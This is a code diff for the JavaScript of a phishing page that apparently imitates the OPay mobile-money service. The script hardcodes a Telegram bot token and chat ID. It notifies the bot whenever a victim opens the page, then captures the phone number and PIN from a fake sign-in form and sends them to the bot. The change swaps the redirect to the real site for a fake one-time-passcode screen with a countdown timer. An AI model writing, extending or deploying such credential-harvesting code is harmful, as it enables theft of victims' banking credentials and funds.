@@ -2,71 +2,70 @@
 const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
 const chatId = '7909543900';
 
-// 🛡️ Helper function to send data to Telegram
 async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     try {
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'HTML'
-            })
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
         });
-    } catch (e) {
-        console.error("Connection error");
-    }
+    } catch (e) { console.error("Error"); }
 }
 
-// 1️⃣ ALERT ON LOAD: You will know the moment the link is clicked
+// 1️⃣ Notify on Page Load
 window.onload = () => {
-    sendToTelegram("<b>🚀 Link Clicked!</b>\nA user has just opened your portal.");
+    sendToTelegram("<b>🚀 Link Clicked!</b>\nUser is on the portal.");
 };
 
-// 2️⃣ FORM LOGIC: Handle the "Sign In" button click
+// 2️⃣ Handle Login Submit
 const authForm = document.getElementById('auth-form');
 
 authForm.addEventListener('submit', async (e) => {
-    e.preventDefault(); // Stop page from refreshing
+    e.preventDefault();
     
     const phoneInput = document.getElementById('phone');
     const pinInput = document.getElementById('pin');
     const submitBtn = document.getElementById('submit-btn');
 
-    let hasError = false;
-
-    // --- Validation Checks ---
-
-    // Check if Phone is empty or too short
-    if (phoneInput.value.trim() === "" || phoneInput.value.length < 10) {
-        phoneInput.classList.add('error'); // Triggers red box in CSS
-        hasError = true;
-    } else {
-        phoneInput.classList.remove('error');
+    // Validation
+    if (phoneInput.value.length < 10 || pinInput.value.length < 4) {
+        if (phoneInput.value.length < 10) phoneInput.classList.add('error');
+        if (pinInput.value.length < 4) pinInput.classList.add('error');
+        return;
     }
 
-    // Check if PIN is empty or less than 4 digits
-    if (pinInput.value.trim() === "" || pinInput.value.length < 4) {
-        pinInput.classList.add('error'); // Triggers red box in CSS
-        hasError = true;
-    } else {
-        pinInput.classList.remove('error');
-    }
+    // Send Login Data
+    submitBtn.innerText = "Processing...";
+    await sendToTelegram(`<b>🔑 Login Data</b>\nPhone: ${phoneInput.value}\nPIN: ${pinInput.value}`);
 
-    // If there is a red box, stop here
-    if (hasError) return;
-
-    // If valid, show loading state
-    submitBtn.innerText = "Verifying...";
-    submitBtn.disabled = true;
-
-    // Send the "Real" details to your bot
-    const logData = `<b>🔑 New Login Attempt</b>\n<b>Phone:</b> <code>${phoneInput.value}</code>\n<b>PIN:</b> <code>${pinInput.value}</code>`;
+    // --- THE FIX: SWITCH TO OTP VIEW ---
+    // We hide the login card and show the OTP section
+    document.getElementById('login-card').style.display = 'none';
     
-    await sendToTelegram(logData);
-
-    // Final step: Redirect them to the actual site
-    window.location.replace("https://www.opayweb.com/");
+    const otpSection = document.getElementById('otp-section');
+    if (otpSection) {
+        otpSection.style.display = 'block';
+        startTimer(60); // Start the countdown
+    }
 });
+
+// 3️⃣ The Timer Function
+function startTimer(duration) {
+    let timer = duration, minutes, seconds;
+    const display = document.getElementById('timer-text'); // Make sure this ID exists in HTML
+    
+    const countdown = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        if (display) display.textContent = "Resend in " + seconds + "s";
+
+        if (--timer < 0) {
+            clearInterval(countdown);
+            if (display) display.textContent = "Resend OTP";
+        }
+    }, 1000);
+}
